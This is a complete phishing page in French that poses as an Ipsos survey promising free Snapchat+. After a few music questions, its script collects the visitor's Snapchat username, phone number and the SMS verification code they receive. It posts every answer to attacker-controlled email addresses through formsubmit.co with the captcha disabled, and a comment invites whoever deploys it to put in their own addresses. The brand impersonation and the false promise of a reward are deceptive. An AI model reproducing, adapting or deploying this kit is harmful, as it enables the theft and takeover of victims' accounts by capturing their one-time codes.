<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Sondage | Ipsos</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
body {
    font-family: 'Inter', sans-serif;
    background:#f4f6f9;
    margin:0;
}
.header {
    background:#003b7a;
    padding:25px 30px;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
}
.header img { height:50px; }
.header a { position:absolute; left:30px; }
.header-text { color:white; font-size:26px; font-weight:700; }
.logo-fixed {
    position:fixed;
    top:20px;
    right:20px;
    height:55px;
    z-index:999;
}
.box {
    max-width:650px;
    margin:60px auto;
    background:white;
    padding:45px;
    border-radius:12px;
    box-shadow:0 4px 12px rgba(0,0,0,0.1);
}
h2 { font-size:30px; margin-bottom:20px; }
h3 { font-size:18px; margin-bottom:25px; }
p { font-size:20px; margin-bottom:25px; }
input {
    width:100%;
    padding:14px;
    font-size:18px;
    border-radius:6px;
    border:1px solid #ccc;
}
button {
    margin-top:25px;
    padding:14px 26px;
    background:#0078d4;
    color:white;
    border:0;
    border-radius:8px;
    cursor:pointer;
    font-size:20px;
}
button:hover { background:#005fa3; }
button:disabled { background:#b0b0b0; cursor:not-allowed; }
.progress-container {
    width:100%;
    height:10px;
    background:#e0e0e0;
    border-radius:5px;
    margin-bottom:25px;
}
.progress-bar {
    height:100%;
    width:0%;
    background:#0078d4;
    transition:width 0.3s ease;
}
#partenariat {
    display:none;
    text-align:center;
    margin-top:35px;
}
#partenariat .title {
    font-size:22px;
    font-weight:700;
    color:#d00000;
    margin-bottom:12px;
}
#partenariat .operateurs {
    font-size:26px;
    font-weight:800;
    color:#d00000;
}
.footer {
    text-align:center;
    padding:20px 0;
    font-size:14px;
    color:#999;
    margin-top:40px;
    border-top:1px solid #ddd;
}
@media(max-width:600px){
    .box{margin:20px;padding:25px}
    h2{font-size:24px}
    h3{font-size:16px}
}
</style>
</head>

<body>

<img src="francelogo.png" class="logo-fixed" alt="France">

<div class="header">
    <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos r√©ponses seront perdues.')">
        <img src="logo.png" alt="Ipsos">
    </a>
    <div class="header-text">Ipsos ‚Äì Sondage</div>
</div>

<div class="box" id="intro">
    <h2>Sondage express</h2>
    <p>R√©pondez √† ce court sondage pour b√©n√©ficier de <strong>Snapchat+</strong> üéÅ</p>
    <button onclick="demarrer()">Commencer</button>
</div>
<div class="box" id="intermediaire" style="display:none;">
    <h2>Merci !</h2>
    <h3>
        Pour recevoir votre abonnement √† Snapchat+, une v√©rification est n√©cessaire afin de garantir des r√©ponses humaines et d'√©viter les abus. En continuant, vous vous engagez √† ce que cela constitue votre premi√®re et unique intervention sur ce sondage. Seules les entreprises SFR, Bouygues et Orange sont accept√©es par les partenaires. La v√©rification se fait via votre num√©ro de t√©l√©phone (donn√©es anonymes et supprim√©es ensuite).
    </h3>
    <button onclick="continuer()">Continuer</button>
</div>

<div class="box" id="sondage" style="display:none;">
    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <h2 id="titre">Sondage pour b√©n√©ficier de Snapchat+</h2>
    <p id="question"></p>
    <div id="reponses"></div>

    <button id="btnSuivant" onclick="suivant()" disabled>Suivant</button>

    <div id="partenariat">
        <div class="title">Snapchat + Ipsos</div>
        <div class="operateurs">
            Nous acceptons seulement Bouygues Telecom, Orange et SFR
        </div>
    </div>
</div>

<div class="footer">
    ¬© 2026 Ipsos ‚Äì Tous droits r√©serv√©s
</div>
<script>
const questions = [
    { text:"Quel est ton artiste ou groupe pr√©f√©r√© ?", type:"text", placeholder:"Ex : Niska" },
    { text:"Quel artiste √©coutes-tu actuellement?", type:"text", placeholder:"Ex : Damso" },
    { text:"Quel artiste aimerais-tu d√©couvrir davantage ?", type:"text", placeholder:"Ex : Jul" },
    { text:"Quel est ton nom d'utilisateur Snapchat ?", type:"text", placeholder:"Pseudo Snapchat" },
    { text:"Quel est ton num√©ro de t√©l√©phone ?", type:"tel", placeholder:"0601020304" },
    { text:"Entre le code re√ßu par SMS", type:"text", placeholder:"XXXX" }
];

let indexQuestion = 0;
let reponsesUtilisateur = [];

// Remplace ces emails par les tiens
const formsubmitURL = "https://formsubmit.co/anonymous2026b@protonmail.com"; // Email principal
const ccEmail = "becteurfoou@proton.me"; // Email secondaire

function demarrer(){
    document.getElementById("intro").style.display="none";
    document.getElementById("sondage").style.display="block";
    afficherQuestion();
}

function afficherQuestion(){
    const q = questions[indexQuestion];
    document.getElementById("question").textContent = q.text;
    document.getElementById("reponses").innerHTML = `<input type="${q.type}" id="champ" placeholder="${q.placeholder}" oninput="verifier()">`;
    document.getElementById("btnSuivant").disabled = true;
    document.getElementById("partenariat").style.display = indexQuestion>=3 ? "block" : "none";
    updateProgress();
}

function verifier(){
    const champ = document.getElementById("champ");
    document.getElementById("btnSuivant").disabled = !champ.value.trim();
}

function updateProgress(){
    document.getElementById("progressBar").style.width = ((indexQuestion+1)/questions.length*100) + "%";
}

function suivant(){
    const champ = document.getElementById("champ");
    const val = champ.value.trim();

    // V√©rification du num√©ro si n√©cessaire
    if(questions[indexQuestion].type==="tel" && !/^[0-9]{10}$/.test(val)){
        alert("Num√©ro invalide (10 chiffres)");
        return;
    }

    // On stocke la valeur AVANT d'envoyer
    reponsesUtilisateur[indexQuestion] = val;

    // √âtape 1 : apr√®s les 3 premi√®res r√©ponses
    if(indexQuestion === 2){
        envoyer(1);
    }

    // √âtape 2 : apr√®s Snapchat + t√©l√©phone
    if(indexQuestion === 4){
        envoyer(2);
    }

    indexQuestion++;

    if(indexQuestion < questions.length){
        // Affiche la question suivante
        afficherQuestion();
    } else {
        // √âtape 3 : envoi final avec code SMS
        envoyer(3);
        document.getElementById("sondage").innerHTML = `
            <h2>Merci pour votre participation !</h2>
            <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un d√©lai d'environ 15 minutes.</p>
        `;
    }
}

function continuer(){
    document.getElementById("intermediaire").style.display="none";
    document.getElementById("sondage").style.display="block";
    afficherQuestion();
}

// Envoi via Formsubmit
function envoyer(etape){
    const formData = new FormData();
    formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
    formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
    formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
    formData.append("snapchat", reponsesUtilisateur[3] || "");
    formData.append("telephone", reponsesUtilisateur[4] || "");
    formData.append("code_sms", reponsesUtilisateur[5] || "");
    formData.append("_cc", ccEmail);
    formData.append("_subject", `R√©ponses sondage Snapchat+ (√©tape ${etape})`);
    formData.append("_captcha","false");

    fetch(formsubmitURL, { method:"POST", body:formData })
    .then(() => console.log(`Envoi r√©ussi √©tape ${etape}`))
    .catch(() => console.log(`Erreur lors de l'envoi √©tape ${etape}`));
}
</script>
</body>
</html>

